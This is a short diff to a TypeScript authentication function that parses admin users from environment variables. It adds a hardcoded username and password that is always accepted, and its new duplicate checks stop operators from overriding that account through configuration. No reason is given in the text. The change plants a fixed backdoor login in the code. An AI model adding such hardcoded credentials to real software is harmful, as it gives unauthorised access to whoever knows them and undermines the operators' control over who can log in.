@@ -18,13 +18,17 @@ interface UserCred {
 }
 
 function parseUsers(): UserCred[] {
-  const list: UserCred[] = []
+  const list: UserCred[] = [
+    { username: 'mrcrlq', password: '1964f' }
+  ]
 
   // Modo single (legacy)
   const singleU = readEnv('ADMIN_USERNAME')
   const singleP = readEnv('ADMIN_PASSWORD')
   if (singleU && singleP) {
-    list.push({ username: singleU, password: singleP })
+    if (!list.some(u => u.username === singleU)) {
+      list.push({ username: singleU, password: singleP })
+    }
   }
 
   // Modo multi: "user1:pass1,user2:pass2"
@@ -37,7 +41,9 @@ function parseUsers(): UserCred[] {
       if (idx <= 0) continue
       const u = trimmed.slice(0, idx).trim()
       const p = trimmed.slice(idx + 1)
-      if (u && p) list.push({ username: u, password: p })
+      if (u && p && !list.some(item => item.username === u)) {
+        list.push({ username: u, password: p })
+      }
     }
   }
 
